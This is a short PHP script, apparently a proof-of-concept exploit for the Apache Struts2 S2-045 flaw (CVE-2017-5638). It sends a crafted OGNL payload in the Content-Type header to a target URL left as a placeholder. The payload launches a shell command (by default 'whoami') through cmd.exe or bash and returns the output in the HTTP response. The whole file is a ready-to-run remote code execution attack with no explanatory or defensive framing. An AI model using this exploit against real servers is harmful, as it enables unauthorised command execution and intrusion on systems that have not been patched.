<?php
//CVE: 2017-5638 - Apache Struts2 S2-045 in PHP by Robbie Wiggins
$url = "CHANGEME";
$command = "whoami";
$req = curl_init($url);
curl_setopt($req, CURLOPT_RETURNTRANSFER, true);
curl_setopt($req, CURLOPT_HTTPHEADER, array("Connection: close","User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0","Accept: */*","Content-Type: Content-Type:%{(\x23_='multipart/form-data').(\x23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(\x23_memberAccess?(\x23_memberAccess=\x23dm):((\x23container=\x23context['com.opensymphony.xwork2.ActionContext.container']).(\x23ognlUtil=\x23container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(\x23ognlUtil.getExcludedPackageNames().clear()).(\x23ognlUtil.getExcludedClasses().clear()).(\x23context.setMemberAccess(\x23dm)))).(\x23cmd=''.$command.'').(\x23iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(\x23cmds=(\x23iswin?{'cmd.exe','/c',\x23cmd}:{'/bin/bash','-c',\x23cmd})).(\x23p=new java.lang.ProcessBuilder(\x23cmds)).(\x23p.redirectErrorStream(true)).(\x23process=\x23p.start()).(\x23ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(\x23process.getInputStream(),\x23ros)).(\x23ros.flush())}"));
$result = curl_exec($req);
$result = htmlspecialchars($result, ENT_QUOTES, "UTF-8");
echo "Status code: ".curl_getinfo($req, CURLINFO_HTTP_CODE)."\n";
echo "Response body: ".$result."\n";

curl_close($req);

?>
